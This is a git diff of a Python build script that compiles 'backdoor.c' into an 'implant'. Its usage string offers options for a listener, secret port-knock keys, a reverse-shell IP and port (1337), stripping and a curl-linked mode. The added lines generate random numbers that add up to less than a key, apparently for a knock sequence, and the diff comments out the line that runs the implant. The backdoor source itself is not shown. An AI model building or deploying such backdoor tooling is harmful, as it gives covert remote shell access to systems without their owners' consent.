@@ -4,6 +4,7 @@ import binascii
 import os
 import subprocess
 import csv
+import random
 
 parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 92.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')
 
@@ -74,7 +75,6 @@ args = parser.parse_args()
 
 cmd = ["gcc", "backdoor.c", "-o", args.outputName]
 
-arg = str(args.ipAddress)
 #DEBUG
 if args.debug:
     cmd.insert(2, "-D DEBUG=1")
@@ -162,10 +162,23 @@ if args.static:
 if args.secImp:
     cmd.insert(2, "-lcurl")
     cmd.insert(2, "-D SECIMP")
+count = 0
+
+listOfNumbers = [] 
+
+key = 345670
+target = key
+number = 4
+while (number-1) > count: # loop generates n-1 random numbers 
+            temp = random.randint(100,int(round(key/number))) #that add up to a number less than the key
+            listOfNumbers.append(temp)
+            count += 1
+
+print(listOfNumbers)
 
 print(cmd)
 subprocess.run(cmd)
-subprocess.run("./implant")
+#subprocess.run("./implant")
 
 
 with open('log.csv', mode='a+') as log_file:
